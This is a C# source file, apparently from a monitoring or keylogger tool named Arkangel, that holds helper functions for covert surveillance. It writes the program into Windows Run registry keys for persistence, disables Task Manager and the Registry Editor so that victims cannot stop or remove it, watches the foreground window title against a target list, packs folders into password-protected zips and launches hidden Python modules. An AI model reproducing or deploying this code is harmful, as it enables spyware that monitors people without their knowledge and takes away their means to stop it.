using Ionic.Zip;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace Arkangel
{
    public static class Functions
    {
        public static void AddApplicationToCurrentUserStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("Arkangle", "\"" + System.Reflection.Assembly.GetExecutingAssembly().Location + "\"");
            }
        }

        public static void AddApplicationToAllUserStartup()
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("Arkangle", "\"" + System.Reflection.Assembly.GetExecutingAssembly().Location + "\"");
            }
        }

        public static void RemoveApplicationFromCurrentUserStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.DeleteValue("Arkangle", false);
            }
        }

        public static void RemoveApplicationFromAllUserStartup()
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.DeleteValue("Arkangle", false);
            }
        }

        public static bool IsUserAdministrator()
        {
            //bool value to hold our return value
            bool isAdmin;
            try
            {
                //get the currently logged in user
                WindowsIdentity user = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(user);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (UnauthorizedAccessException ex)
            {
                isAdmin = false;
            }
            catch (Exception ex)
            {
                isAdmin = false;
            }
            return isAdmin;
        }

        /// <summary>
        /// Disable or enable task manager. need to restart to confirm
        /// </summary>
        /// <param name="enable"></param> if enable = true => delete registry and restart
        public static void SetTaskManager(bool enable)
        {
            if (enable == true)
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
                {
                    key.SetValue("DisableTaskMgr", "0", RegistryValueKind.DWord);
                }
            else
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
                {
                    key.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
                }

        }

        // edit group policy to disable Registry editor
        public static void PreventAccessRegistryEditor(bool enable)
        {
            if (enable == true)
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
                {
                    key.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
                }
            else
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
                {
                    key.SetValue("DisableRegistryTools", "0", RegistryValueKind.DWord);
                }
            //ComputerGroupPolicyObject.SetPolicySetting(@"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System!DisableRegistryTools", "0", RegistryValueKind.DWord);
        }

        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);
        //[DllImport("user32.dll")]

        public static string GetActiveWindowText()
        {
            var handle = GetForegroundWindow();
            var sb = new StringBuilder();
            try
            {
                GetWindowText(handle, sb, 1000);
            }
            catch (Exception ex)
            {
                return null;
            }
            return sb.Length == 0 ? "UnhandleWindow" : sb.ToString();
        }

        public static bool IsTarget(string winTitle, List<string> targetList)
        {
            if (targetList.Count == 0)
                return false;
            foreach (var s in targetList)
            {
                if (winTitle.ToLower().Contains(s) == true || s.Contains(winTitle.ToLower()))
                    return true;
            }
            return false;
        }

        public static void ZipFolder(string dir, string password)
        {
            using (ZipFile zip = new ZipFile())
            {
                if (Directory.Exists(dir))
                {
                    zip.Password = password;
                    zip.AddDirectory(dir+"\\");
                    zip.Save(dir + ".zip");
                }
            }
        }

        public static void CallPyModule(string module)
        {
            Process myProcess = new Process();

            try
            {
                myProcess.StartInfo.UseShellExecute = true;
                // You can start any process, HelloWorld is a do-nothing example.
                myProcess.StartInfo.FileName = "..\\..\\Module_py\\" + module;
                myProcess.StartInfo.CreateNoWindow = true;
                myProcess.Start();
                // This code assumes the process you are starting will terminate itself. 
                // Given that is is started without a window so you cannot terminate it 
                // on the desktop, it must terminate itself or you can do it programmatically
                // from this application using the Kill method.
                //myProcess.Kill();
            }
            catch (Exception ex)
            {
                Console.WriteLine("MESSAGE: " + ex.Message);
            }
        }
    }
}
